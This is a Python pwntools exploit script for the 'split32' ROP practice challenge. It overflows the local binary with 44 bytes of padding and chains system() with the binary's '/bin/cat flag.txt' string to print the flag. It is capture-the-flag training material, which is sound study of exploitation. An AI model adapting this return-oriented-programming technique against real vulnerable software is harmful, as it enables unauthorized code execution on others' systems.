from pwn import *

exe = ELF("./split32", checksec=False)
p = process(exe.path)

rop = ROP(exe)

system = exe.symbols['system']
bin_cat_flag = next(exe.search(b"/bin/cat flag.txt")) # rabin2 -z split32
ret = rop.find_gadget(["ret"])[0]

payload = b'A' * 44
payload += p32(system)
payload += p32(ret)                  # pseudo-address
payload += p32(bin_cat_flag)

p.sendlineafter('>', payload)

output = p.recvall().decode(errors="ignore")
print(output)